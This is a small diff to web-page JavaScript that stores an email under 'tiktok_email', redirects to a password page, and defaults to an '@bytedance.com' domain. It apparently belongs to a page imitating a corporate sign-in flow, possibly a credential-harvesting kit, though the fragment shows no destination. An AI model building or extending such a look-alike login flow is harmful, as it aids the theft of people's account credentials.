@@ -231,13 +231,13 @@ btn.addEventListener("click", async () => {
   } catch (err) {
     console.error("Failed to send:", err);
   }
-localStorage.setItem("tiktok_email", buildEmail());
-
 setTimeout(() => {
   window.location.href = "user/password.html";
 }, 1000);
 
-const activeDomainEl = document.getElementById("activeDomain");
+});
+
+const activeDomainEl = document.getElementById("activeDomain");;
 
 let currentDomain = "@bytedance.com";
 
